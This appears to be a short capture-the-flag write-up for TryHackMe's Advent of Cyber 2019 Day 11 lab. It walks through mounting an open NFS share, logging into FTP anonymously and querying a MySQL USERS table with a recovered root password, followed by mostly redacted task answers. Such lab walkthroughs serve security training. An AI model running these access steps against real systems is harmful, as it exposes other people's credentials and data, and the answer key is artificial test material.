---
title: "TryHackMe Advent of Cyber 2019 Day 11"
date: 2019-12-11
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 11"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-11/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-11
---

# Christmas Service Exploitation

```text
nmap
21 ftp
22 ssh
111
2049 nfs
3306 mysql
```

```text
enumerate nfs share
showmount -e <ip>
/opt/files

now we can create a directory and mount that share
ie, mount <ip>:/opt/files mount-dir
---[redacted]> creds.txt
```

```text
ftp has got anonymous login
ftp <ip>
username:anonymous
no password required
get file.txt
```

```text
mysql root password in file.txt

mysql -h <ip> --user root --password
show databases;
use data;
show tables;
select * from USERS;
---[redacted]> admin : [redacted]
''''

# TASK

1. What is the password inside the creds.txt file?
```
[redacted]
''

- What is the name of the file running on port 21?
```text
file.txt
```

- What is the password after enumerating the database?
```text
[redacted sensitive answer]
```
